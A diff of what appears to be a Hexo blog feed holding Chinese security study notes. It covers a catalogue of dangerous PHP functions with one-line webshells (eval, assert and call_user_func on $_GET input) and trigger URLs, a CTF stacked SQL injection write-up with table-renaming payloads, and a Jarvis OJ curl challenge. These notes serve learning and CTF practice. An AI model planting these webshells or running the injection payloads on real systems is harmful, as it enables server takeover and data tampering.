@@ -11,6 +11,20 @@
     <content type="html"><![CDATA[<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>mixed eval ( string $code )<br>把字符串code作为php代码执行。常见的一句话木马：<br>（<code>)&lt;?php    eval($_GET[&#39;pass&#39;])?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a>;</p></blockquote><p>得到phpinfo()页面。</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>PHP 5</p><p>bool assert ( mixed $assertion [, string $description ] )<br>PHP 7</p><p>bool assert ( mixed $assertion [, Throwable $exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p><p>一句话木马：<br>(<code>)&lt;?php    assert($_GET[&#39;pass&#39;]);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a></p></blockquote><p>phpinfo()后可以不用分号。得到phpinfo()页面。</p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )<br>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：php-preg_replace</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。<br>(<code>)&lt;?php    call_user_func($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</a></p></blockquote><h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>mixed call_user_func_array ( callable $callback , array $param_arr )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。<br>(<code>)&lt;?php    call_user_func_array($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</a></p></blockquote><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>string create_function ( string $args , string $code )<br>该函数的内部实现用到了eval，所以也具有相同的安全问题。第一个参数args是后面定义函数的参数，第二个参数是函数的代码。<br>(<code>)&lt;?php    $a = $_GET[&#39;chybeta&#39;];    $b = create_function(&#39;$a&#39;,&quot;echo $a&quot;);    $b(&#39;&#39;);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo();</p></blockquote><p>##array_map()<br>array array_map ( callable $callback , array $array1 [, array $… ] )<br>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。<br>(<code>)&lt;?php    $array = array(0,1,2,3,4,5);    array_map($_GET[&#39;chybeta&#39;],$array);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo</p></blockquote><p>注意没有括号()和分号;。</p><h1 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h1><h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>string system ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>(<code>)&lt;?php    system(&quot;whoami&quot;);?&gt;(</code>)<br>会看到运行了shell命令，并打印回显到页面上。</p><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><p>void passthru ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。<br>(<code>)&lt;?php    passthru(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )<br>exec() 执行 command 参数所指定的命令。 其余参数，见文档<br>(<code>)&lt;?php    echo exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h2><p>void pcntl_exec ( string $path [, array $args [, array $envs ]] )<br>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。<br>(<code>)&lt;?php    pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt;(</code>)</p><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><p>string shell_exec ( string $cmd )<br>cmd是要执行的命令。<br>(<code>)&lt;?php    echo shell_exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h2><p>resource popen ( string $command , string $mode )<br>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。<br>(<code>)&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;(</code>)</p><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h2><p>resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )<br>cmd是要执行的命令，其余见文档</p><p><code>(反单引号)在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“</code>”的效果与函数 shell_exec() 相同。<br>(<code>)&lt;?php    echo `whoami`;?&gt;(</code>)<br>##ob_start()<br>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )<br>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p><p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的_GET[a]作为cmd的参数。<br>(<code>)&lt;?php    $cmd = &#39;system&#39;;    ob_start($cmd);    echo &quot;$_GET[a]&quot;;    ob_end_flush();?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?a=whoami" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?a=whoami</a></p></blockquote><h2 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h2><p>mail 文档<br>(<code>)bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])(</code>)<br>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p><p>配置SMTP服务器的主机名和端口<br>配置PHP用作邮件传输代理（MTA）的文件路径<br>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件</p>]]></content>
     
     
+    <categories>
+      
+      <category>WEB</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB</tag>
+      
+      <tag>PHP</tag>
+      
+    </tags>
     
   </entry>
   
@@ -24,6 +38,20 @@
     <content type="html"><![CDATA[<p>##堆叠注入</p><p>预编译绕过<br>预编译相关语法如下：</p><p>set用于设置变量名和值<br>prepare用于预备一个语句，并赋予名称，以后可以引用该语句<br>execute执行语句<br>deallocate prepare用来释放掉预处理的语句</p><p>直接看payload就懂了：</p><p>-1’;set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#</p><p>拆分开来如下<br>-1’;<br>set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);<br>prepare stmt from @sql;<br>EXECUTE stmt;</p><p>我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。</p><p>修改表名和列名的语法如下：</p><p>修改表名(将表名user改为users)<br>alter table user rename to users;</p><p>修改列名(将字段名username改为name)<br>alter table users change uesrname name varchar(30);</p><p>最终payload如下：</p><p>1’; alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p><p>拆分开来如下<br>1’;<br>alter table words rename to words1;<br>alter table <code>1919810931114514</code> rename to words;<br>alter table words change flag id varchar(50);</p>]]></content>
     
     
+    <categories>
+      
+      <category>SQL注入</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
     
   </entry>
   
@@ -34,9 +62,23 @@
     <link href="/2019/12/21/Jarvis-OJ-port-51/"/>
     <url>/2019/12/21/Jarvis-OJ-port-51/</url>
     
-    <content type="html"><![CDATA[<hr><p>title: Jarvis OJ port 51<br>date: 2019-12-21 22:52:01<br>tags:WEB</p><hr><p>题目链接: <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br>访问页面之后，页面显示：</p><p>Please use port 51 to visit this site.</p><p>当时看到了这个还以为是需要访问这个网站的51端口，但是这个网址已经确定了是访问32770端口，后来一直都没有思路。最后才发现是要求本地以51端口去访问这个网址。payload如下：</p><blockquote><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p></blockquote><p>最后就可以拿到flag</p><hr><p>curl，全称CommandLine URL 或 CommandLine Uniform Resource Locator，顾名思义，curl命令是在命令行方式下工作，利用URL的语法进行数据的传输或者文件的传输。</p><p><strong>CURL具体用法</strong><br>(<a href="https://itbilu.com/linux/man/4yZ9qH_7X.html" target="_blank" rel="noopener">https://itbilu.com/linux/man/4yZ9qH_7X.html</a>)</p>]]></content>
+    <content type="html"><![CDATA[<p>题目链接: <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br>访问页面之后，页面显示：</p><p>Please use port 51 to visit this site.</p><p>当时看到了这个还以为是需要访问这个网站的51端口，但是这个网址已经确定了是访问32770端口，后来一直都没有思路。最后才发现是要求本地以51端口去访问这个网址。payload如下：</p><blockquote><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p></blockquote><p>最后就可以拿到flag</p><hr><p>curl，全称CommandLine URL 或 CommandLine Uniform Resource Locator，顾名思义，curl命令是在命令行方式下工作，利用URL的语法进行数据的传输或者文件的传输。</p><p><strong>CURL具体用法</strong><br>(<a href="https://itbilu.com/linux/man/4yZ9qH_7X.html" target="_blank" rel="noopener">https://itbilu.com/linux/man/4yZ9qH_7X.html</a>)</p>]]></content>
     
     
+    <categories>
+      
+      <category>WEB</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB</tag>
+      
+      <tag>Jarvis OJ</tag>
+      
+    </tags>
     
   </entry>
   
